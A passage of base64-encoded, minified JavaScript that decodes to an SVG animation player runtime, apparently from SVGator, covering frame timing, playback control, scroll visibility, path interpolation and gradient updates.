ZW9mIHQmJmlzRmluaXRlKHQpJiZNYXRoLmZsb29yKHQpPT09dH0pLE51bWJlci5FUFNJTE9OfHwoTnVtYmVyLkVQU0lMT049MjIyMDQ0NjA0OTI1MDMxM2UtMzEpO3ZhciBzdD1mdW5jdGlvbigpe2Z1bmN0aW9uIHQobixlKXt2YXIgaT1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06e307cih0aGlzLHQpLHRoaXMuX2lkPTAsdGhpcy5fcnVubmluZz0hMSx0aGlzLl9yb2xsaW5nQmFjaz0hMSx0aGlzLl9hbmltYXRpb25zPW4sdGhpcy5kdXJhdGlvbj1lLmR1cmF0aW9uLHRoaXMuYWx0ZXJuYXRlPWUuYWx0ZXJuYXRlLHRoaXMuZmlsbD1lLmZpbGwsdGhpcy5pdGVyYXRpb25zPWUuaXRlcmF0aW9ucyx0aGlzLmRpcmVjdGlvbj1pLmRpcmVjdGlvbnx8MSx0aGlzLnNwZWVkPWkuc3BlZWR8fDEsdGhpcy5mcHM9aS5mcHN8fDEwMCx0aGlzLm9mZnNldD1pLm9mZnNldHx8MCx0aGlzLnJvbGxiYWNrU3RhcnRPZmZzZXQ9MH1yZXR1cm4gdSh0LFt7a2V5OiJfcm9sbGJhY2siLHZhbHVlOmZ1bmN0aW9uKCl7dmFyIHQ9dGhpcyxuPTEvMCxlPW51bGw7dGhpcy5yb2xsYmFja1N0YXJ0T2Zmc2V0PXRoaXMub2Zmc2V0LHRoaXMuX3JvbGxpbmdCYWNrfHwodGhpcy5fcm9sbGluZ0JhY2s9ITAsdGhpcy5fcnVubmluZz0hMCk7dGhpcy5faWQ9d2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZSgoZnVuY3Rpb24gcihpKXtpZih0Ll9yb2xsaW5nQmFjayl7bnVsbD09ZSYmKGU9aSk7dmFyIHU9aS1lLG89dC5yb2xsYmFja1N0YXJ0T2Zmc2V0LXUsYT1NYXRoLnJvdW5kKG8qdC5zcGVlZCk7aWYoYT50LmR1cmF0aW9uJiZuIT0xLzApe3ZhciBsPSEhdC5hbHRlcm5hdGUmJmEvdC5kdXJhdGlvbiUyPjEscz1hJXQuZHVyYXRpb247YT0ocys9bD90LmR1cmF0aW9uOjApfHx0LmR1cmF0aW9ufXZhciBmPXQuZnBzPzFlMy90LmZwczowLGM9TWF0aC5tYXgoMCxhKTtpZihjPG4tZil7dC5vZmZzZXQ9YyxuPWM7Zm9yKHZhciBoPXQuX2FuaW1hdGlvbnMsdj1oLmxlbmd0aCxkPTA7ZDx2O2QrKyloW2RdKGMsdC5kaXJlY3Rpb24pfXZhciB5PSExO2lmKHQuaXRlcmF0aW9ucz4wJiYtMT09PXQuZmlsbCl7dmFyIGc9dC5pdGVyYXRpb25zKnQuZHVyYXRpb24scD1nPT1hO2E9cD8wOmEsdC5vZmZzZXQ9cD8wOnQub2Zmc2V0LHk9YT5nfWE+MCYmdC5vZmZzZXQ+PWEmJiF5P3QuX2lkPXdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUocik6dC5zdG9wKCl9fSkpfX0se2tleToiX3N0YXJ0Iix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PXRoaXMsbj1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxlPS0xLzAscj1udWxsLGk9e30sdT1mdW5jdGlvbiB1KG8pe3QuX3J1bm5pbmc9ITAsbnVsbD09ciYmKHI9byk7dmFyIGE9TWF0aC5yb3VuZCgoby1yK24pKnQuc3BlZWQpLGw9dC5mcHM/MWUzL3QuZnBzOjA7aWYoYT5lK2wmJiF0Ll9yb2xsaW5nQmFjayl7dC5vZmZzZXQ9YSxlPWE7Zm9yKHZhciBzPXQuX2FuaW1hdGlvbnMsZj1zLmxlbmd0aCxjPTAsaD0wO2g8ZjtoKyspaVtoXT9jKys6KGlbaF09c1toXShhLHQuZGlyZWN0aW9uKSxpW2hdJiZjKyspO2lmKGM9PT1mKXJldHVybiB2b2lkIHQuX3N0b3AoKX10Ll9pZD13aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHUpfTt0aGlzLl9pZD13aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHUpfX0se2tleToiX3N0b3AiLHZhbHVlOmZ1bmN0aW9uKCl7dGhpcy5faWQmJndpbmRvdy5jYW5jZWxBbmltYXRpb25GcmFtZSh0aGlzLl9pZCksdGhpcy5fcnVubmluZz0hMSx0aGlzLl9yb2xsaW5nQmFjaz0hMX19LHtrZXk6InBsYXkiLHZhbHVlOmZ1bmN0aW9uKCl7IXRoaXMuX3JvbGxpbmdCYWNrJiZ0aGlzLl9ydW5uaW5nfHwodGhpcy5fcm9sbGluZ0JhY2s9ITEsdGhpcy5yb2xsYmFja1N0YXJ0T2Zmc2V0PnRoaXMuZHVyYXRpb24mJih0aGlzLm9mZnNldD10aGlzLnJvbGxiYWNrU3RhcnRPZmZzZXQtKHRoaXMucm9sbGJhY2tTdGFydE9mZnNldC10aGlzLm9mZnNldCkldGhpcy5kdXJhdGlvbix0aGlzLnJvbGxiYWNrU3RhcnRPZmZzZXQ9MCksdGhpcy5fc3RhcnQodGhpcy5vZmZzZXQpKX19LHtrZXk6InN0b3AiLHZhbHVlOmZ1bmN0aW9uKCl7dGhpcy5fc3RvcCgpLHRoaXMub2Zmc2V0PTAsdGhpcy5yb2xsYmFja1N0YXJ0T2Zmc2V0PTA7dmFyIHQ9dGhpcy5kaXJlY3Rpb24sbj10aGlzLl9hbmltYXRpb25zO3dpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKGZ1bmN0aW9uKCl7Zm9yKHZhciBlPTA7ZTxuLmxlbmd0aDtlKyspbltlXSgwLHQpfSkpfX0se2tleToicmVhY2hlZFRvRW5kIix2YWx1ZTpmdW5jdGlvbigpe3JldHVybiB0aGlzLml0ZXJhdGlvbnM+MCYmdGhpcy5vZmZzZXQ+PXRoaXMuaXRlcmF0aW9ucyp0aGlzLmR1cmF0aW9ufX0se2tleToicmVzdGFydCIsdmFsdWU6ZnVuY3Rpb24oKXt0aGlzLl9zdG9wKCksdGhpcy5vZmZzZXQ9MCx0aGlzLl9zdGFydCgpfX0se2tleToicGF1c2UiLHZhbHVlOmZ1bmN0aW9uKCl7dGhpcy5fc3RvcCgpfX0se2tleToicmV2ZXJzZSIsdmFsdWU6ZnVuY3Rpb24oKXt0aGlzLmRpcmVjdGlvbj0tdGhpcy5kaXJlY3Rpb259fV0sW3trZXk6ImJ1aWxkIix2YWx1ZTpmdW5jdGlvbihlLHIpe3JldHVybiBkZWxldGUgZS5hbmltYXRpb25TZXR0aW5ncyxlLm9wdGlvbnM9bHQoZS5vcHRpb25zLGUucm9vdCwiOTFjODBkNzciKSxlLmFuaW1hdGlvbnMubWFwKChmdW5jdGlvbih0KXt2YXIgcj1sdCh0LnMsZS5yb290LCI5MWM4MGQ3NyIpO2Zvcih2YXIgaSBpbiBkZWxldGUgdC5zLGUuYW5pbWF0aW9uU2V0dGluZ3N8fChlLmFuaW1hdGlvblNldHRpbmdzPW4oe30scikpLHIpci5oYXNPd25Qcm9wZXJ0eShpKSYmKHRbaV09cltpXSl9KSksKGU9ZnVuY3Rpb24odCxuKXtpZigkPW4sIXR8fCF0LnJvb3R8fCFBcnJheS5pc0FycmF5KHQuYW5pbWF0aW9ucykpcmV0dXJuIG51bGw7Zm9yKHZhciBlPWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJzdmciKSxyPSExLGk9MDtpPGUubGVuZ3RoO2krKylpZihlW2ldLmlkPT09dC5yb290JiYhZVtpXS5zdmdhdG9yQW5pbWF0aW9uKXsocj1lW2ldKS5zdmdhdG9yQW5pbWF0aW9uPSEwO2JyZWFrfWlmKCFyKXJldHVybiBudWxsO3ZhciB1PXQuYW5pbWF0aW9ucy5tYXAoKGZ1bmN0aW9uKHQpe3JldHVybiBpdChyLHQpfSkpLmZpbHRlcigoZnVuY3Rpb24odCl7cmV0dXJuISF0fSkpO3JldHVybiB1Lmxlbmd0aD97ZWxlbWVudDpyLGFuaW1hdGlvbnM6dSxhbmltYXRpb25TZXR0aW5nczp0LmFuaW1hdGlvblNldHRpbmdzLG9wdGlvbnM6dC5vcHRpb25zfHx2b2lkIDB9Om51bGx9KGUscikpP3tlbDplLmVsZW1lbnQsb3B0aW9uczplLm9wdGlvbnN8fHt9LHBsYXllcjpuZXcgdChlLmFuaW1hdGlvbnMsZS5hbmltYXRpb25TZXR0aW5ncyxlLm9wdGlvbnMpfTpudWxsfX0se2tleToicHVzaCIsdmFsdWU6ZnVuY3Rpb24odCl7cmV0dXJuIHRoaXMuYnVpbGQodCl9fSx7a2V5OiJpbml0Iix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PXRoaXMsbj13aW5kb3cuX19TVkdBVE9SX1BMQVlFUl9fJiZ3aW5kb3cuX19TVkdBVE9SX1BMQVlFUl9fWyI5MWM4MGQ3NyJdO0FycmF5LmlzQXJyYXkobikmJm4uc3BsaWNlKDApLmZvckVhY2goKGZ1bmN0aW9uKG4pe3JldHVybiB0LmJ1aWxkKG4pfSkpfX1dKSx0fSgpOyFmdW5jdGlvbigpe2Zvcih2YXIgdD0wLG49WyJtcyIsIm1veiIsIndlYmtpdCIsIm8iXSxlPTA7ZTxuLmxlbmd0aCYmIXdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWU7KytlKXdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWU9d2luZG93W25bZV0rIlJlcXVlc3RBbmltYXRpb25GcmFtZSJdLHdpbmRvdy5jYW5jZWxBbmltYXRpb25GcmFtZT13aW5kb3dbbltlXSsiQ2FuY2VsQW5pbWF0aW9uRnJhbWUiXXx8d2luZG93W25bZV0rIkNhbmNlbFJlcXVlc3RBbmltYXRpb25GcmFtZSJdO3dpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWV8fCh3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lPWZ1bmN0aW9uKG4pe3ZhciBlPURhdGUubm93KCkscj1NYXRoLm1heCgwLDE2LShlLXQpKSxpPXdpbmRvdy5zZXRUaW1lb3V0KChmdW5jdGlvbigpe24oZStyKX0pLHIpO3JldHVybiB0PWUrcixpfSx3aW5kb3cuY2FuY2VsQW5pbWF0aW9uRnJhbWU9d2luZG93LmNsZWFyVGltZW91dCl9KCk7dmFyIGZ0PWZ1bmN0aW9uKHQsbil7dmFyIGU9ITEscj1udWxsO3JldHVybiBmdW5jdGlvbihpKXtlJiZjbGVhclRpbWVvdXQoZSksZT1zZXRUaW1lb3V0KChmdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbigpe2Zvcih2YXIgaT0wLHU9d2luZG93LmlubmVySGVpZ2h0LG89MCxhPXdpbmRvdy5pbm5lcldpZHRoLGw9dC5wYXJlbnROb2RlO2wgaW5zdGFuY2VvZiBFbGVtZW50Oyl7dmFyIHM9d2luZG93LmdldENvbXB1dGVkU3R5bGUobCk7aWYoInZpc2libGUiIT09cy5vdmVyZmxvd1l8fCJ2aXNpYmxlIiE9PXMub3ZlcmZsb3dYKXt2YXIgZj1sLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpOyJ2aXNpYmxlIiE9PXMub3ZlcmZsb3dZJiYoaT1NYXRoLm1heChpLGYudG9wKSx1PU1hdGgubWluKHUsZi5ib3R0b20pKSwidmlzaWJsZSIhPT1zLm92ZXJmbG93WCYmKG89TWF0aC5tYXgobyxmLmxlZnQpLGE9TWF0aC5taW4oYSxmLnJpZ2h0KSl9aWYobD09PWwucGFyZW50Tm9kZSlicmVhaztsPWwucGFyZW50Tm9kZX1lPSExO3ZhciBjPXQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCksaD1NYXRoLm1pbihjLmhlaWdodCxNYXRoLm1heCgwLGktYy50b3ApKSx2PU1hdGgubWluKGMuaGVpZ2h0LE1hdGgubWF4KDAsYy5ib3R0b20tdSkpLGQ9TWF0aC5taW4oYy53aWR0aCxNYXRoLm1heCgwLG8tYy5sZWZ0KSkseT1NYXRoLm1pbihjLndpZHRoLE1hdGgubWF4KDAsYy5yaWdodC1hKSksZz0oYy5oZWlnaHQtaC12KS9jLmhlaWdodCxwPShjLndpZHRoLWQteSkvYy53aWR0aCxtPU1hdGgucm91bmQoZypwKjEwMCk7bnVsbCE9PXImJnI9PT1tfHwocj1tLG4obSkpfSgpfSksMTAwKX19LGN0PWZ1bmN0aW9uKCl7ZnVuY3Rpb24gdChuLGUsaSl7cih0aGlzLHQpLGU9TWF0aC5tYXgoMSxlfHwxKSxlPU1hdGgubWluKGUsMTAwKSx0aGlzLmVsPW4sdGhpcy5vblRyZXNob2xkQ2hhbmdlPWkmJmkuY2FsbD9pOmZ1bmN0aW9uKCl7fSx0aGlzLnRyZXNob2xkUGVyY2VudD1lfHwxLHRoaXMuY3VycmVudFZpc2liaWxpdHk9bnVsbCx0aGlzLnZpc2liaWxpdHlDYWxjdWxhdG9yPWZ0KG4sdGhpcy5vblZpc2liaWxpdHlVcGRhdGUuYmluZCh0aGlzKSksdGhpcy5iaW5kU2Nyb2xsV2F0Y2hlcnMoKSx0aGlzLnZpc2liaWxpdHlDYWxjdWxhdG9yKCl9cmV0dXJuIHUodCxbe2tleToiYmluZFNjcm9sbFdhdGNoZXJzIix2YWx1ZTpmdW5jdGlvbigpe2Zvcih2YXIgdD10aGlzLmVsLnBhcmVudE5vZGU7dCYmKHQuYWRkRXZlbnRMaXN0ZW5lcigic2Nyb2xsIix0aGlzLnZpc2liaWxpdHlDYWxjdWxhdG9yKSx0IT09dC5wYXJlbnROb2RlJiZ0IT09ZG9jdW1lbnQpOyl0PXQucGFyZW50Tm9kZX19LHtrZXk6Im9uVmlzaWJpbGl0eVVwZGF0ZSIsdmFsdWU6ZnVuY3Rpb24odCl7dmFyIG49dGhpcy5jdXJyZW50VmlzaWJpbGl0eT49dGhpcy50cmVzaG9sZFBlcmNlbnQsZT10Pj10aGlzLnRyZXNob2xkUGVyY2VudDtpZihudWxsPT09dGhpcy5jdXJyZW50VmlzaWJpbGl0eXx8biE9PWUpcmV0dXJuIHRoaXMuY3VycmVudFZpc2liaWxpdHk9dCx2b2lkIHRoaXMub25UcmVzaG9sZENoYW5nZShlKTt0aGlzLmN1cnJlbnRWaXNpYmlsaXR5PXR9fV0pLHR9KCk7ZnVuY3Rpb24gaHQodCl7cmV0dXJuIGcodCkrIiJ9ZnVuY3Rpb24gdnQodCl7dmFyIG49YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOiIgIjtyZXR1cm4gdCYmdC5sZW5ndGg/dC5tYXAoaHQpLmpvaW4obik6IiJ9ZnVuY3Rpb24gZHQodCl7cmV0dXJuIGh0KHQueCkrIiwiK2h0KHQueSl9ZnVuY3Rpb24geXQodCl7cmV0dXJuIHQ/bnVsbD09dC5hfHx0LmE+PTE/InJnYigiK3QucisiLCIrdC5nKyIsIit0LmIrIikiOiJyZ2JhKCIrdC5yKyIsIit0LmcrIiwiK3QuYisiLCIrdC5hKyIpIjoidHJhbnNwYXJlbnQifWZ1bmN0aW9uIGd0KHQpe3JldHVybiB0PyJ1cmwoIyIrdCsiKSI6Im5vbmUifXZhciBwdD17ZjpudWxsLGk6Vix1OmZ1bmN0aW9uKHQsbil7cmV0dXJuIGZ1bmN0aW9uKGUpe3ZhciByPW4oZSk7dC5zZXRBdHRyaWJ1dGUoInJ4IixodChyLngpKSx0LnNldEF0dHJpYnV0ZSgicnkiLGh0KHIueSkpfX19LG10PXtmOm51bGwsaTpmdW5jdGlvbih0LG4sZSl7cmV0dXJuIDA9PT10P246MT09PXQ/ZTp7d2lkdGg6Rih0LG4ud2lkdGgsZS53aWR0aCksaGVpZ2h0OkYodCxuLmhlaWdodCxlLmhlaWdodCl9fSx1OmZ1bmN0aW9uKHQsbil7cmV0dXJuIGZ1bmN0aW9uKGUpe3ZhciByPW4oZSk7dC5zZXRBdHRyaWJ1dGUoIndpZHRoIixodChyLndpZHRoKSksdC5zZXRBdHRyaWJ1dGUoImhlaWdodCIsaHQoci5oZWlnaHQpKX19fTtPYmplY3QuZnJlZXplKHtNOjIsTDoyLFo6MCxIOjEsVjoxLEM6NixROjQsVDoyLFM6NCxBOjd9KTt2YXIgYnQ9e30sd3Q9bnVsbDtmdW5jdGlvbiBBdCh0KXt2YXIgbj1mdW5jdGlvbigpe2lmKHd0KXJldHVybiB3dDtpZigib2JqZWN0IiE9PSgidW5kZWZpbmVkIj09dHlwZW9mIGRvY3VtZW50PyJ1bmRlZmluZWQiOmUoZG9jdW1lbnQpKXx8IWRvY3VtZW50LmNyZWF0ZUVsZW1lbnROUylyZXR1cm57fTt2YXIgdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoImh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiwic3ZnIik7cmV0dXJuIHQmJnQuc3R5bGU/KHQuc3R5bGUucG9zaXRpb249ImFic29sdXRlIix0LnN0eWxlLm9wYWNpdHk9IjAuMDEiLHQuc3R5bGUuekluZGV4PSItOTk5OSIsdC5zdHlsZS5sZWZ0PSItOTk5OXB4Iix0LnN0eWxlLndpZHRoPSIxcHgiLHQuc3R5bGUuaGVpZ2h0PSIxcHgiLHd0PXtzdmc6dH0pOnt9fSgpLnN2ZztpZighbilyZXR1cm4gZnVuY3Rpb24odCl7cmV0dXJuIG51bGx9O3ZhciByPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnROUyhuLm5hbWVzcGFjZVVSSSwicGF0aCIpO3Iuc2V0QXR0cmlidXRlTlMobnVsbCwiZCIsdCksci5zZXRBdHRyaWJ1dGVOUyhudWxsLCJmaWxsIiwibm9uZSIpLHIuc2V0QXR0cmlidXRlTlMobnVsbCwic3Ryb2tlIiwibm9uZSIpLG4uYXBwZW5kQ2hpbGQocik7dmFyIGk9ci5nZXRUb3RhbExlbmd0aCgpO3JldHVybiBmdW5jdGlvbih0KXt2YXIgbj1yLmdldFBvaW50QXRMZW5ndGgoaSp0KTtyZXR1cm57eDpuLngseTpuLnl9fX1mdW5jdGlvbiB4dCh0KXtyZXR1cm4gYnRbdF0/YnRbdF06YnRbdF09QXQodCl9ZnVuY3Rpb24ga3QodCxuLGUscil7aWYoIXR8fCFyKXJldHVybiExO3ZhciBpPVsiTSIsdC54LHQueV07aWYobiYmZSYmKGkucHVzaCgiQyIpLGkucHVzaChuLngpLGkucHVzaChuLnkpLGkucHVzaChlLngpLGkucHVzaChlLnkpKSxuPyFlOmUpe3ZhciB1PW58fGU7aS5wdXNoKCJRIiksaS5wdXNoKHUueCksaS5wdXNoKHUueSl9cmV0dXJuIG58fGV8fGkucHVzaCgiTCIpLGkucHVzaChyLngpLGkucHVzaChyLnkpLGkuam9pbigiICIpfWZ1bmN0aW9uIF90KHQsbixlLHIpe3ZhciBpPWFyZ3VtZW50cy5sZW5ndGg+NCYmdm9pZCAwIT09YXJndW1lbnRzWzRdP2FyZ3VtZW50c1s0XToxLHU9a3QodCxuLGUsciksbz14dCh1KTt0cnl7cmV0dXJuIG8oaSl9Y2F0Y2godCl7cmV0dXJuIG51bGx9fWZ1bmN0aW9uIFN0KHQsbixlLHIpe3ZhciBpPTEtcjtyZXR1cm4gaSppKnQrMippKnIqbityKnIqZX1mdW5jdGlvbiBPdCh0LG4sZSxyKXtyZXR1cm4gMiooMS1yKSoobi10KSsyKnIqKGUtbil9ZnVuY3Rpb24gTXQodCxuLGUscil7dmFyIGk9YXJndW1lbnRzLmxlbmd0aD40JiZ2b2lkIDAhPT1hcmd1bWVudHNbNF0mJmFyZ3VtZW50c1s0XSx1PV90KHQsbixudWxsLGUscik7cmV0dXJuIHV8fCh1PXt4OlN0KHQueCxuLngsZS54LHIpLHk6U3QodC55LG4ueSxlLnkscil9KSxpJiYodS5hPUV0KHQsbixlLHIpKSx1fWZ1bmN0aW9uIEV0KHQsbixlLHIpe3JldHVybiBNYXRoLmF0YW4yKE90KHQueSxuLnksZS55LHIpLE90KHQueCxuLngsZS54LHIpKX1mdW5jdGlvbiBqdCh0LG4sZSxyLGkpe3ZhciB1PWkqaTtyZXR1cm4gaSp1KihyLXQrMyoobi1lKSkrMyp1Kih0K2UtMipuKSszKmkqKG4tdCkrdH1mdW5jdGlvbiBQdCh0LG4sZSxyLGkpe3ZhciB1PTEtaTtyZXR1cm4gMyoodSp1KihuLXQpKzIqdSppKihlLW4pK2kqaSooci1lKSl9ZnVuY3Rpb24gSXQodCxuLGUscixpKXt2YXIgdT1hcmd1bWVudHMubGVuZ3RoPjUmJnZvaWQgMCE9PWFyZ3VtZW50c1s1XSYmYXJndW1lbnRzWzVdLG89X3QodCxuLGUscixpKTtyZXR1cm4gb3x8KG89e3g6anQodC54LG4ueCxlLngsci54LGkpLHk6anQodC55LG4ueSxlLnksci55LGkpfSksdSYmKG8uYT1CdCh0LG4sZSxyLGkpKSxvfWZ1bmN0aW9uIEJ0KHQsbixlLHIsaSl7cmV0dXJuIE1hdGguYXRhbjIoUHQodC55LG4ueSxlLnksci55LGkpLFB0KHQueCxuLngsZS54LHIueCxpKSl9ZnVuY3Rpb24gUnQodCxuLGUpe3JldHVybiB0KyhuLXQpKmV9ZnVuY3Rpb24gVHQodCxuLGUpe3ZhciByPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdJiZhcmd1bWVudHNbM10saT17eDpSdCh0Lngsbi54LGUpLHk6UnQodC55LG4ueSxlKX07cmV0dXJuIHImJihpLmE9TnQodCxuKSksaX1mdW5jdGlvbiBOdCh0LG4pe3JldHVybiBNYXRoLmF0YW4yKG4ueS10Lnksbi54LXQueCl9ZnVuY3Rpb24gQ3QodCxuLGUpe3ZhciByPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdJiZhcmd1bWVudHNbM107aWYoTHQobikpe2lmKHF0KGUpKXJldHVybiBNdChuLGUuc3RhcnQsZSx0LHIpfWVsc2UgaWYoTHQoZSkpe2lmKG4uZW5kKXJldHVybiBNdChuLG4uZW5kLGUsdCxyKX1lbHNle2lmKG4uZW5kKXJldHVybiBlLnN0YXJ0P0l0KG4sbi5lbmQsZS5zdGFydCxlLHQscik6TXQobixuLmVuZCxlLHQscik7aWYoZS5zdGFydClyZXR1cm4gTXQobixlLnN0YXJ0LGUsdCxyKX1yZXR1cm4gVHQobixlLHQscil9ZnVuY3Rpb24gRnQodCxuLGUpe3ZhciByPUN0KHQsbixlLCEwKTtyZXR1cm4gci5hPWZ1bmN0aW9uKHQpe3JldHVybiBhcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXSYmYXJndW1lbnRzWzFdP3QrTWF0aC5QSTp0fShyLmEpL20scn1mdW5jdGlvbiBMdCh0KXtyZXR1cm4hdC50eXBlfHwiY29ybmVyIj09PXQudHlwZX1mdW5jdGlvbiBxdCh0KXtyZXR1cm4gbnVsbCE9dC5zdGFydCYmIUx0KHQpfXZhciBWdD1uZXcgVDt2YXIgRHQ9e2Y6ZnVuY3Rpb24odCl7cmV0dXJuIHQ/dC5qb2luKCIgIik6IiJ9LGk6ZnVuY3Rpb24odCxuLHIpe2lmKDA9PT10KXJldHVybiBuO2lmKDE9PT10KXJldHVybiByO3ZhciBpPW4ubGVuZ3RoO2lmKGkhPT1yLmxlbmd0aClyZXR1cm4gTih0LG4scik7Zm9yKHZhciB1LG89bmV3IEFycmF5KGkpLGE9MDthPGk7YSsrKXtpZigodT1lKG5bYV0pKSE9PWUoclthXSkpcmV0dXJuIE4odCxuLHIpO2lmKCJudW1iZXIiPT09dSlvW2FdPUModCxuW2FdLHJbYV0pO2Vsc2V7aWYoblthXSE9PXJbYV0pcmV0dXJuIE4odCxuLHIpO29bYV09blthXX19cmV0dXJuIG99fSx6dD17ZjpudWxsLGk6WSx1OmZ1bmN0aW9uKHQsbil7cmV0dXJuIGZ1bmN0aW9uKGUpe3ZhciByPW4oZSk7dC5zZXRBdHRyaWJ1dGUoIngxIixodChyWzBdKSksdC5zZXRBdHRyaWJ1dGUoInkxIixodChyWzFdKSksdC5zZXRBdHRyaWJ1dGUoIngyIixodChyWzJdKSksdC5zZXRBdHRyaWJ1dGUoInkyIixodChyWzNdKSl9fX0sWXQ9e2Y6aHQsaTpDfSxHdD17ZjpodCxpOkx9LFV0PXtmOmZ1bmN0aW9uKHQpe3ZhciBuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXToiICI7cmV0dXJuIHQmJnQubGVuZ3RoPjAmJih0PXQubWFwKChmdW5jdGlvbih0KXtyZXR1cm4gZyh0LDQpfSkpKSx2dCh0LG4pfSxpOmZ1bmN0aW9uKHQsbixlKXt2YXIgcixpLHUsbz1uLmxlbmd0aCxhPWUubGVuZ3RoO2lmKG8hPT1hKWlmKDA9PT1vKW49RyhvPWEsMCk7ZWxzZSBpZigwPT09YSlhPW8sZT1HKG8sMCk7ZWxzZXt2YXIgbD0odT0ocj1vKSooaT1hKS9mdW5jdGlvbih0LG4pe2Zvcih2YXIgZTtuOyllPW4sbj10JW4sdD1lO3JldHVybiB0fHwxfShyLGkpKTwwPy11OnU7bj1VKG4sTWF0aC5mbG9vcihsL28pKSxlPVUoZSxNYXRoLmZsb29yKGwvYSkpLG89YT1sfWZvcih2YXIgcz1bXSxmPTA7ZjxvO2YrKylzLnB1c2goZyhGKHQsbltmXSxlW2ZdKSkpO3JldHVybiBzfX07ZnVuY3Rpb24gJHQodCxuLGUpe3JldHVybiB0Lm1hcCgoZnVuY3Rpb24odCl7cmV0dXJuIGZ1bmN0aW9uKHQsbixlKXt2YXIgcj10LnY7aWYoIXJ8fCJnIiE9PXIudHx8ci5zfHwhci52fHwhci5yKXJldHVybiB0O3ZhciBpPWUuZ2V0RWxlbWVudEJ5SWQoci5yKSx1PWkmJmkucXVlcnlTZWxlY3RvckFsbCgic3RvcCIpfHxbXTtyZXR1cm4gci5zPXIudi5tYXAoKGZ1bmN0aW9uKHQsbil7dmFyIGU9dVtuXSYmdVtuXS5nZXRBdHRyaWJ1dGUoIm9mZnNldCIpO3JldHVybntjOnQsbzplPWcocGFyc2VJbnQoZSkvMTAwKX19KSksZGVsZXRlIHIudix0fSh0LDAsZSl9KSl9dmFyIFd0PXtndDoiZ3JhZGllbnRUcmFuc2Zvcm0iLGM6e3g6ImN4Iix5OiJjeSJ9LHJkOiJyIixmOnt4OiJ4MSIseToieTEifSx0bzp7eDoieDIiLHk6InkyIn19O2Z1bmN0aW9uIEh0KHQsbixyLGksdSxvLGEsbCl7cmV0dXJuICR0KHQsMCxsKSxuPWZ1bmN0aW9uKHQsbixlKXtmb3IodmFyIHIsaSx1LG89dC5sZW5ndGgtMSxhPXt9LGw9MDtsPD1vO2wrKykocj10W2xdKS5lJiYoci5lPW4oci5lKSksci52JiYiZyI9PT0oaT1yLnYpLnQmJmkuciYmKHU9ZS5nZXRFbGVtZW50QnlJZChpLnIpKSYmKGFbaS5yXT17ZTp1LHM6dS5xdWVyeVNlbGVjdG9yQWxsKCJzdG9wIil9KTtyZXR1cm4gYX0odCxpLGwpLGZ1bmN0aW9uKGkpe3ZhciB1PXIoaSx0LFF0KTtpZighdSlyZXR1cm4ibm9uZSI7aWYoImMiPT09dS50KXJldHVybiB5dCh1LnYpO2lmKCJnIj09PXUudCl7aWYoIW5bdS5yXSlyZXR1cm4gZ3QodS5yKTt2YXIgbz1uW3Uucl07cmV0dXJuIGZ1bmN0aW9uKHQsbil7Zm9yKHZhciBlPXQucyxyPWUubGVuZ3RoO3I8bi5sZW5ndGg7cisrKXt2YXIgaT1lW2UubGVuZ3RoLTFdLmNsb25lTm9kZSgpO2kuaWQ9WnQoaS5pZCksdC5lLmFwcGVuZENoaWxkKGkpLGU9dC5zPXQuZS5xdWVyeVNlbGVjdG9yQWxsKCJzdG9wIil9Zm9yKHZhciB1PTAsbz1lLmxlbmd0aCxhPW4ubGVuZ3RoLTE7dTxvO3UrKyllW3VdLnNldEF0dHJpYnV0ZSgic3RvcC1jb2xvciIseXQobltNYXRoLm1pbih1LGEpXS5jKSksZVt1XS5zZXRBdHRyaWJ1dGUoIm9mZnNldCIsbltNYXRoLm1pbih1LGEpXS5vKX0obyx1LnMpLE9iamVjdC5rZXlzKFd0KS5mb3JFYWNoKChmdW5jdGlvbih0KXtpZih2b2lkIDAhPT11W3RdKWlmKCJvYmplY3QiIT09ZShXdFt0XSkpe3ZhciBuLHI9Imd0Ij09PXQ/KG49dVt0XSxBcnJheS5pc0FycmF5KG4pPyJtYXRyaXgoIituLmpvaW4oIiAiKSsiKSI6IiIpOnVbdF0saT1XdFt0XTtvLmUuc2V0QXR0cmlidXRlKGkscil9ZWxzZSBPYmplY3Qua2V5cyhXdFt0XSkuZm9yRWFjaCgoZnVuY3Rpb24obil7aWYodm9pZCAwIT09dVt0XVtuXSl7dmFyIGU9dVt0XVtuXSxyPVd0W3RdW25dO28uZS5zZXRBdHRyaWJ1dGUocixlKX19KSl9KSksZ3QodS5yKX1yZXR1cm4ibm9uZSJ9fWZ1bmN0aW9uIFF0KHQsZSxyKXtpZigwPT09dClyZXR1cm4gZTtpZigxPT09dClyZXR1cm4gcjtpZihlJiZyKXt2YXIgaT1lLnQ7aWYoaT09PXIudClzd2l0Y2goZS50KXtjYXNlImMi